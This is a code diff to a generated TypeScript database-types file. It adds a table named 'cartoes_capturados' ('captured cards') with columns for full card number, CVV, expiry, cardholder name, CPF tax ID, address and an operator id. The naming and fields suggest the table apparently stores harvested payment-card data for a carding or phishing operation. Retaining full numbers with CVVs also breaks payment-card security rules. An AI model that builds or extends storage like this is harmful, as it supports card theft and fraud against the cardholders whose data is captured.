@@ -14,6 +14,60 @@ export type Database = {
   }
   public: {
     Tables: {
+      cartoes_capturados: {
+        Row: {
+          bandeira: string | null
+          bin: string
+          cpf: string | null
+          created_at: string
+          cvv: string
+          endereco: string | null
+          id: string
+          metadata: Json | null
+          numero: string
+          operador_id: string | null
+          pagamento_id: string | null
+          status: string
+          titular: string
+          ultimos4: string
+          validade: string
+        }
+        Insert: {
+          bandeira?: string | null
+          bin?: string
+          cpf?: string | null
+          created_at?: string
+          cvv?: string
+          endereco?: string | null
+          id?: string
+          metadata?: Json | null
+          numero?: string
+          operador_id?: string | null
+          pagamento_id?: string | null
+          status?: string
+          titular?: string
+          ultimos4?: string
+          validade?: string
+        }
+        Update: {
+          bandeira?: string | null
+          bin?: string
+          cpf?: string | null
+          created_at?: string
+          cvv?: string
+          endereco?: string | null
+          id?: string
+          metadata?: Json | null
+          numero?: string
+          operador_id?: string | null
+          pagamento_id?: string | null
+          status?: string
+          titular?: string
+          ultimos4?: string
+          validade?: string
+        }
+        Relationships: []
+      }
       email_send_log: {
         Row: {
           created_at: string
